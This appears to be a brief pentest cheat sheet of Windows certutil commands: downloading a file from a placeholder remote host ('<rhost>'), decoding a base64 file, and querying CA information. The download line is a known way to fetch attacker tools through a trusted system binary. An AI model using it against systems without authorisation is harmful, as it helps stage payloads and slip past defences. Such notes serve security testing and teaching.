### Download file
```
certutil -urlcache -split -f http://<rhost>/<file>
```

### Decode base64 file
```
certutil -decode <base64File> <decodedFile>
```

### Get CA host
```
certutil -TCAInfo
```

